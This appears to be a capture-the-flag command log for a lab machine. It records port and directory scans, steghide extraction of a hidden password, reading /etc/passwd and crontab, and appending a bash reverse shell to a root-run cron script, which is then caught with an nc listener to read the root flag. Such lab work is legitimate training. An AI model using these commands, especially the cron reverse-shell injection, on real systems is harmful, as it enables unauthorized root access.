# ------------ port scans @attack ------------
sudo nmap -p- 10.10.2.247 -o nmap_-p-.log # scan all ports
sudo nmap -sC -sV 10.10.2.247 -o nmap_sC_sV.log # scan for scripts and versions
nmap -sC -sV -p 65524 -o nmap_sF.log 10.10.2.247 # scan for firewall
# found port 80, 22, 65524

gobuster dir -u http://10.10.2.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log # scan for directories


sudo apt install steghide # install steghide
steghide --help # check steghide options
steghide extract -p "mypasswordforthatjob" binarycodepixabay.jpg # extract hidden file from image
# found hidden file: secrettext.txt | converted binary password to text: mypasswordforthatjob

## ------------- shell @target --------------
whoami
id
pwd
ls -al
cat user.txt # get user flag
cat /etc/passwd # check users
cat /etc/crontab # check cron jobs
# found file /var/www/mysecretjob.sh being run every minute and owned by boring but run as root
ls -al /var/www/
nano /var/www/mysecretjob.sh # check script
echo "bash -i >& /dev/tcp/<MY_M/C_IP>/1274 0>&1" >> /var/www/mysecretjob.sh # add reverse shell to script

## ------------------ shell 2 @attack ------------------
nc -nvlp 1274 # listen for connection for root shell
> pwd
> whoami
> ls /root
> ls -al /root
> cat /root/.root.txt # get root flag